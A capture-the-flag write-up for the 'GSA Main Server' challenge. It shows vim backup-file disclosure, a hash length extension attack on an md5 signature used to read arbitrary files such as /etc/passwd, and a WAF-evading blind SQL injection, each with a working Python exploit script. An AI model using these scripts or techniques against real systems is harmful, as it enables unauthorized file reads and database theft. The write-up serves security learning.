# GSA Main Server

The participants were given a portal containing some information and it has some features such as downloading attachments and etc. After spending some time on the task, I notieced a comment in the last line of index.php file:

```
<!--# vim: syntax=apache ts=4 sw=4 sts=4 sr noet-->
```

Indicating the file has been modified by vim, so I checked `index.php~`, nothing useful but:
```
<? require 'html/header.php'; ?>
<? require 'functions.php' ?>
<? require 'infoDB.php' ?>
```
I checked all pages by adding ~ and, `functions.php~` was there:
```
<?php

// database configuration
include 'configuration.php';

// waf to protect the web attacks
include 'waf.php';

// connection to the database
$mysqli = new mysqli(__DB_HOST, __DB_USER, __DB_PASS, __DB_NAME);

// signature function
// store __KEY in safe place
// __KEY is stored in configuration.php
// do not change the __KEY if you don't know how the system workes, the installation process produces secure 10-chacacter key
function makeSignature($fileName){
    return md5(md5(__KEY) . $fileName);
}

// function to get header data by HTTP packet
function getHeaderData($headers, $name){
    return (array_key_exists($name, $headers))?$headers[$name]:false;
}

// parsing the database resultst
function resultToArray($result){
    $rows = array();
    while($row = $result->fetch_assoc()){
        $rows[] = $row;
    }
    return $rows;
}

// end
```
On the other side, in portal (*http://178.62.34.76/showInformation/2*) there was an attachment to download:

```
GET /getAttachment/file.txt HTTP/1.1
Host: 178.62.34.76
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Signature: beb2e68c628653c72abcb388b078cfda
X-Requested-With: XMLHttpRequest
Referer: http://178.62.34.76/showInformation/2
Connection: close
```

It had two important parts, filename which was given by URL and `X-Signature: beb2e68c628653c72abcb388b078cfda` which prevented from changing file name:
```
GET /getAttachment/blahblah HTTP/1.1
Host: 178.62.34.76
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Signature: beb2e68c628653c72abcb388b078cfda
X-Requested-With: XMLHttpRequest
Referer: http://178.62.34.76/showInformation/2
Connection: close


Rsponse: Error: Invalid Signature has been given
```

Back to the functions.php, if makeSignature makes the signature, there are two notes:

+ The key cannot be brute forced, because the length was 10 character as mentioned in comment
+ The function was vulnerbale to Hash Length Extension

So I used hashpumpy library to exploit the hole:

```
import requests
import hashpumpy
import urllib
import sys

if len(sys.argv) != 2:
	print ''
	print '[>] Usage: python {} [path]'.format(sys.argv[0])
	print '[>] Example: python {} ../../../../../../etc/passwd'.format(sys.argv[0])
	print ''
	sys.exit()

new_digest, new_data = hashpumpy.hashpump('beb2e68c628653c72abcb388b078cfda', 'file.txt', '?/' + sys.argv[1] , 32)
new_data_encoded = urllib.quote_plus(urllib.quote_plus(new_data))

print ''
print '[>] New Signature: {}'.format(new_digest)
print '[>] New data: {}'.format(new_data.encode('hex'))
print '[+] Result:'
print ''
print '~~~~~~'

headers = {'X-Signature': new_digest}
response = requests.get('http://178.62.34.76/getAttachment/' + new_data_encoded, headers=headers);
print response.text;

print '~~~~~~'
print ''
```

Result:
![](1.png)

I spent much time here, figured out that two files were important to read:

+ Squid config 
+ .htaccess

The htaccess source:

```
RewriteEngine on

RewriteRule simple-php-captcha.php simple-php-captcha.php [L]

RewriteRule showInformation/(.+) /showInformation.php?informationID=$1 [L]
RewriteRule infoSubmit /informationSubmit.php [L]
RewriteRule notConfirmedInformation/(.+) /notConfirmedInformation.php?informationID=$1 [L]
RewriteRule getAttachment/(.+) /getAttachment.php?fileName=$1 [L]
RewriteRule dataSubmitted/(.+) /dataSubmitted.php [L]
RewriteRule adminer-4.3.1-en.php adminer-4.3.1-en.php [L]

#RewriteRule "searchData/(.+)" "http://gsa.dataStorage.domain/0/portalSearch/?searchURL=$1" [L]
#RewriteRule "API/(.+)" "http://gsa.API.domain/api/$1" [L]

RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule . index.php [L]

RewriteCond %{THE_REQUEST} \.php[\ /?].*HTTP/ [NC]
RewriteRule ^.*$ index.php [L]

```

Revealing two new hosts (next questions), and some hidden path such as `notConfirmedInformation/` and etc. `infoSubmit/' path allowed to insert new information and `notConfirmedInformation/` allowed to see the information submitted. After some strugling at this stage, I found that `notConfirmedInformation/{id}` was prone to MySQL injection. However, the injection was tricky because as I deduced:

+ There was two query, first loads the page and second upgrades the view number.
+ The first one was totally secures, the second one had injection though. **The SQLi test was easy**
+ The WAF was annoying, it blocked queries had some keywords such as `union` and replaced some characters such as `space`

###### SQLi test:
http://178.62.34.76/notConfirmedInformation/265940057+and+1=1
http://178.62.34.76/notConfirmedInformation/265940057+and+1=2

Page gets loaded but `Visited` ony upgraded in first request


###### The flag:
Finnaly, I wrote a python code to exploit the injection hole:

```
import requests
import re
import sys

regex = re.compile("<b>Visited:</b> (\d+)</div>")


if len(sys.argv) != 2:
    print ''
    print '[>] Usage: python {} [id]'.format(sys.argv[0])
    print '[>] Example: python {} 265940057'.format(sys.argv[0])
    print ''
    sys.exit()

qq = "http://178.62.34.76/notConfirmedInformation/{}".format(sys.argv[1])
body = requests.get(qq).text

visited = int(regex.findall(body)[0])


#q = "(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))"
#q = "(select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())and(table_name='flag'))"
q = "(select(????)from(flag))"

out = ""
for i in range(1,30):
    for c in range(31,126):
        qq = "http://178.62.34.76/notConfirmedInformation/"+sys.argv[1]+"-if(ord(mid("+q+","+str(i)+",1))="+str(c)+",0,2)"
        #print qq
        body = requests.get(qq).text
        #print body
        visited2 = int(regex.findall(body)[0])


        if visited + 1 == visited2:
            sys.stdout.write(chr(c)) 
            sys.stdout.flush()
            visited = visited2
            break
        if visited2==visited:
            pass
        else:
            pass
```

The Flag: ASIS{SQLi_sT1lL_Ex1sT5_G0od_j0B}

###### Contact
https://twitter.com/yshahinzadeh